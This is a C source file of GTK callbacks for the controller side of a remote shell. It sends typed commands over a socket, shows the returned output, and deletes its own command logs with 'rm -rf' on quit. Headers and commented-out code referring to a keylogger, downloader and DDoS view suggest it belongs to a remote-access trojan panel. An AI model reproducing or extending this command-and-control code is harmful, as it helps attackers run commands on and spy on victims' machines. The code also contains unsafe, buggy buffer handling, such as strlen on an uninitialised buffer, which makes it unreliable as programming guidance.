#include <stdio.h>
#include <stdlib.h>
#include <string.h>  //strlen()

#include <sys/types.h>  // send()
#include <sys/socket.h>  // send()
#include <netinet/in.h>  // SOCKADDR_IN
#include <arpa/inet.h>  // inet_addr()
#include <netdb.h>  //gethostbyaddr()

#include <gtk-2.0/gtk/gtk.h>

#include "../includes/constants.h"
#include "../includes/callbacks_remote_shell.h"

// #include "../includes/keylogger.h"
#include "../includes/utils.h"

#include "../includes/remote_shell.h"

#include "../includes/downloader.h"


extern GtkWidget *main_win;

extern GtkWidget *text_view;
extern GtkWidget *rs_text_view;
extern GtkWidget *historic_text_view;
// GtkWidget *ddos_text_view;

// const gchar *chemin;
// GtkWidget *upload_entry;

GtkWidget *remote_shell_closed_dialog = NULL;
int sended_one_cmd = 0;

extern const gchar *server_ip;
extern const gchar *server_port; // besoin d'extern ici alors pk pas extern dans le clt_main.c ????? -> sinon compil : return 1
extern int port;

//extern SOCKET remote_shell_sock;

extern SOCKET sock;

char *buffer = NULL;
char *log_buffer = NULL;
char *historic_buffer = NULL;


//extern GtkWidget *text_view;
extern GtkWidget *rs_text_view;
//extern GtkWidget *ddos_text_view;
extern GtkWidget *historic_text_view;
extern GtkWidget *remote_shell_command_entry;


/** TAB : Remote Shell **/

void cb_start_remote_shell(GtkButton *button, gpointer user_data)
{
    GtkWidget *start_remote_shell_dialog = NULL;


    start_remote_shell_dialog = gtk_message_dialog_new (GTK_WINDOW(user_data), GTK_DIALOG_MODAL, GTK_MESSAGE_QUESTION, GTK_BUTTONS_YES_NO, "Launch the Remote Shell ?");

    switch(gtk_dialog_run(GTK_DIALOG(start_remote_shell_dialog)))
    {
        case GTK_RESPONSE_YES:
            gtk_widget_destroy(start_remote_shell_dialog);
            remote_shell();
            break;

        case GTK_RESPONSE_NO:
            gtk_widget_destroy(start_remote_shell_dialog);
            break;

        default :
            gtk_widget_destroy(start_remote_shell_dialog);
            break;
    }

    // Parametres inutilises
    (void)button;
    (void)user_data;

    return;
}
void cb_stop_remote_shell(GtkButton *button, gpointer user_data)
{
    FILE *log_cmd_output = NULL;
    char *quit_cmd_buffer = NULL;
    size_t data_len = 0;

    quit_cmd_buffer = malloc(5 * sizeof(char));
    if(quit_cmd_buffer == NULL)
    {
        error("malloc quit_cmd_buffer", "cb_stop_remote_shell()");
        return;
    }

    clean_buffer(quit_cmd_buffer);
    strncpy(quit_cmd_buffer, user_data, strlen("quit"));

    printf("\n\nquit_cmd_buffer = %s\n", quit_cmd_buffer);

    data_len = strlen(quit_cmd_buffer) + 1;

    // Send the command length
    if(send(sock, (char*)&data_len, sizeof(data_len), 0) == SOCKET_ERROR)
    {
        error("send() data_len", "cb_stop_remote_shell()");
        return;
    }

    // Send the command
    if(send(sock, quit_cmd_buffer, data_len, 0) == SOCKET_ERROR)
    {
        error("send() quit_cmd_buffer", "cb_stop_remote_shell()");
        return;
    }

    if(strncmp(quit_cmd_buffer, "quit", 5) == 0)
    {
        log_cmd_output = fopen("Logs/remote_shell.log", "a");
        if(log_cmd_output == NULL)
        {
            error("fopen() log_cmd_output opened with a", "send_cmd()");
            return;
        }

        if(system("rm -rf Logs/cmd_historic.log") == -1)
        {
            error("rm -rf Logs/cmd_historic.log",  "send()");
            return;
        }

        fclose(log_cmd_output);

        //shutdown(sock, SHUT_WR);

        free(quit_cmd_buffer);
    }

    if(sended_one_cmd == 1)
    {
        gtk_entry_set_text(GTK_ENTRY(remote_shell_command_entry), "Use quit command for exit ...");
        sended_one_cmd = 0;

        //free(buffer);
        //free (log_buffer);
        //free (historic_buffer);
    }

    remote_shell_closed_dialog = gtk_message_dialog_new (GTK_WINDOW(main_win), GTK_DIALOG_MODAL, GTK_MESSAGE_INFO, GTK_BUTTONS_CLOSE, "Remote Shell have been closed !");
    switch(gtk_dialog_run(GTK_DIALOG(remote_shell_closed_dialog)))
    {
        default :
            gtk_widget_destroy(remote_shell_closed_dialog);
            break;
    }

    if(system("rm -rf Logs/cmd_historic.log") == -1)
    {
        error("rm -rf Logs/cmd_historic.log",  "cb_stop_remote_shell()");
        return;
    }

    if(system("rm -rf Logs/remote_shell.log") == -1)
    {
        error("rm -rf Logs/remote_shell.log",  "cb_stop_remote_shell()");
        return;
    }

    shutdown(sock, SHUT_WR);

    // Parametres inutilises
    (void)button;

    return;
}

void cb_send_cmd(GtkWidget *widget, gpointer user_data)
{
   //SOCKET remote_shell_sock = 0;

    //GtkWidget *remote_shell_closed_dialog = NULL;

    GtkTextBuffer *text_buffer = NULL;
    gchar *text = NULL;
    GtkTextIter start;
    GtkTextIter end;
    gchar *utf8_text = NULL;

    FILE *log_cmd_output = NULL;
    FILE *log_cmd_historic = NULL;

    char *buffer = NULL;
    const char *buffer_cmd = NULL;
    char *log_buffer = NULL;
    char *historic_buffer = NULL;
    const gchar *start_command = "> Command : ";

    char historic[MAXDATASIZE] = {""};
    //char cmd_output[MAXDATASIZE] = {""};
    int caractereLu = 0;
    int i = 0;
    char line[MAXDATASIZE] = {""};
    //char line_output[MAXDATASIZE] = {""};
    char *print_line = NULL;
    //char *print_line_output = NULL;

    size_t data_len = 0;

    sended_one_cmd = 1;

    buffer_cmd = gtk_entry_get_text(GTK_ENTRY(user_data));

    log_cmd_historic = fopen("Logs/cmd_historic.log", "a");
    if(log_cmd_historic == NULL)
    {
        error("fopen() log_cmd_historic", "cb_send_cmd()");
        return;
    }
    fputs("> Command : ", log_cmd_historic);
    fputs(buffer_cmd, log_cmd_historic);
    fputs("\n", log_cmd_historic);

    fclose(log_cmd_historic);

    log_cmd_output = fopen("Logs/remote_shell.log", "a");
    if(log_cmd_output == NULL)
    {
        error("fopen() log_cmd_output", "cb_send_cmd()");
        return;
    }

    // Write in log file the command name
    fputs("> Command : ", log_cmd_output);
    fputs(buffer_cmd, log_cmd_output);
    fputs("\n", log_cmd_output);

    //var_allocation();

    buffer = malloc(BUFSIZ * sizeof(char));
    if(buffer == NULL)
    {
        error("malloc() buffer", "send_cmd()");
        return;
    }

    log_buffer = malloc(MAXDATASIZE  * sizeof(char));
    if(log_buffer == NULL)
    {
        error("malloc log_buffer", "cb_send_cmd()");
        return;
    }

    historic_buffer = malloc(MAXDATASIZE  * sizeof(char));
    if(historic_buffer == NULL)
    {
        error("malloc historic_buffer", "cb_send_cmd()");
        return;
    }

    data_len = strlen(buffer_cmd) + 1;

    // Send the command length
    if(send(sock, (char*)&data_len, sizeof(data_len), 0) == SOCKET_ERROR)
    {
        error("send() data_len", "cb_send_cmd()");
        return;
    }

    // Send the command
    if(send(sock, buffer_cmd, data_len, 0) == SOCKET_ERROR)
    {
        error("send() buffer_cmd", "cb_send_cmd()");
        return;
    }

    if(strncmp(buffer_cmd, "quit", 4) == 0)
    {

        gtk_entry_set_text(GTK_ENTRY(user_data), "Use quit command for exit ...");

        if(system("rm -rf Logs/cmd_historic.log") == -1)
        {
            error("rm -rf Logs/cmd_historic.log in quit",  "cb_send_cmd()");
            return;
        }

        if(system("rm -rf Logs/remote_shell.log") == -1)
        {
            error("rm -rf Logs/remote_shell.log in quit",  "cb_send_cmd()");
            return;
        }

        //shutdown(remote_shell_sock, SHUT_WR);

        remote_shell_closed_dialog = gtk_message_dialog_new (GTK_WINDOW(main_win), GTK_DIALOG_MODAL, GTK_MESSAGE_INFO, GTK_BUTTONS_CLOSE, "Remote Shell have been closed !");
        switch(gtk_dialog_run(GTK_DIALOG(remote_shell_closed_dialog)))
        {
            default :
                gtk_widget_destroy(remote_shell_closed_dialog);
                break;
        }

        return;
    }

    // Receive the command output
    if(recv(sock, buffer, BUFSIZ, 0) == SOCKET_ERROR)
    {
        error("recv() buffer", "cb_send_cmd()");
        return;
    }

    printf("\n\nCommand output received : %s", buffer);
    printf("\n\n");

    // Write in log file the command output
    fputs(buffer, log_cmd_output);
    fputs("\n", log_cmd_output);

    fclose(log_cmd_output);

    // Fill buffer from print in command's historic
    utf8_text = g_locale_to_utf8(start_command, strlen(start_command), NULL, NULL, NULL);
    historic_buffer = strncpy(historic_buffer, utf8_text, strlen(utf8_text) + 1);
    historic_buffer = strncat(historic_buffer, buffer_cmd, strlen(buffer_cmd) + 1);
    historic_buffer = strncat(historic_buffer, "\n", 2);

    // Print output command in historic
    log_cmd_historic = fopen("Logs/cmd_historic.log", "r");
    if(log_cmd_historic == NULL)
    {
        error("fopen() cmd_historic opened with r", "cb_send_cmd()");
        return;
    }

    utf8_text = g_locale_to_utf8(historic, strlen(historic), NULL, NULL, NULL);

    while((caractereLu = fgetc(log_cmd_historic)) != EOF)
    {
        historic[i] = (char)caractereLu;
        i++;
    }

    print_line = malloc(MAXDATASIZE * sizeof(char));
    if(print_line == NULL)
    {
        error("malloc() print_line", "cb_send_cmd()");
        return;
    }
    fseek(log_cmd_historic, 0, SEEK_SET);

    if(log_cmd_historic != NULL)
    {
        strncpy(print_line, line, strlen(print_line) + 1);
        while (fgets(line, MAXDATASIZE, log_cmd_historic) != NULL)
        {
            strncat(print_line, line, strlen(line));
        }
        fclose(log_cmd_historic);
    }

    utf8_text = g_locale_to_utf8(print_line, strlen(print_line), NULL, NULL, NULL);

    /** Obtaining the buffer associated with the widget **/
    text_buffer = gtk_text_view_get_buffer((GtkTextView*)(historic_text_view));

    /** Set the default buffer text. */
    gtk_text_buffer_set_text(text_buffer, utf8_text, -1);

    /** Obtain iters for the start and end of points of the buffer **/
    gtk_text_buffer_get_start_iter(text_buffer, &start);
    gtk_text_buffer_get_end_iter(text_buffer, &end);

    /** Get the entire buffer text **/
    text = gtk_text_buffer_get_text(text_buffer, &start, &end, FALSE);

    /** Print the text **/

    g_print("%s", text);

    g_free(text);

    /*
    // Prepare for print command out put
    log_cmd_output = fopen("Logs/remote_shell.log", "r");
    if(log_cmd_output == NULL)
    {
        error("fopen() log_cmd_output opened with r", "cb_send_cmd()");
        return;
    }

    utf8_text = g_locale_to_utf8(cmd_output, strlen(cmd_output), NULL, NULL, NULL);

    while((caractereLu = fgetc(log_cmd_output)) != EOF)
    {
        cmd_output[i] = (char)caractereLu;
        i++;
    }

    print_line_output = malloc(MAXDATASIZE * sizeof(char));
    if(print_line_output == NULL)
    {
        error("malloc() print_line_output", "cb_send_cmd()");
        return;
    }
    fseek(log_cmd_output, 0, SEEK_SET);

    if(log_cmd_output != NULL)
    {
        strncpy(print_line_output, line_output, strlen(print_line_output) + 1);
        while (fgets(line_output, MAXDATASIZE, log_cmd_output) != NULL)
        {
            strncat(print_line_output, line_output, strlen(line_output));
        }
        fclose(log_cmd_output);
    }

    // Print outpout command in log
    // Copy the command output
    utf8_text = g_locale_to_utf8(print_line_output, strlen(print_line_output), NULL, NULL, NULL);

    // Obtaining the buffer associated with the widget
    text_buffer = gtk_text_view_get_buffer((GtkTextView*)(rs_text_view));

    // Set the default buffer text.
    gtk_text_buffer_set_text(text_buffer, utf8_text, -1);

    // Obtain iters for the start and end of points of the buffer
    gtk_text_buffer_get_start_iter(text_buffer, &start);
    gtk_text_buffer_get_end_iter(text_buffer, &end);

    // Get the entire buffer text
    text = gtk_text_buffer_get_text(text_buffer, &start, &end, FALSE);

    // Print the text
    g_print("%s", text);

    g_free(text);

    */

    utf8_text = g_locale_to_utf8(buffer, strlen(buffer), NULL, NULL, NULL);

    /** Obtaining the buffer associated with the widget **/
    text_buffer = gtk_text_view_get_buffer((GtkTextView*)(rs_text_view));

    /** Set the default buffer text. */
    gtk_text_buffer_set_text(text_buffer, utf8_text, -1);

    /** Obtain iters for the start and end of points of the buffer **/
    gtk_text_buffer_get_start_iter(text_buffer, &start);
    gtk_text_buffer_get_end_iter(text_buffer, &end);

    /** Get the entire buffer text **/
    text = gtk_text_buffer_get_text(text_buffer, &start, &end, FALSE);

    /** Print the text **/
    g_print("%s", text);

    g_free(text);

    free(buffer);
    free (log_buffer);
    free (historic_buffer);

    // Parametres inutilises
    (void)widget;
}
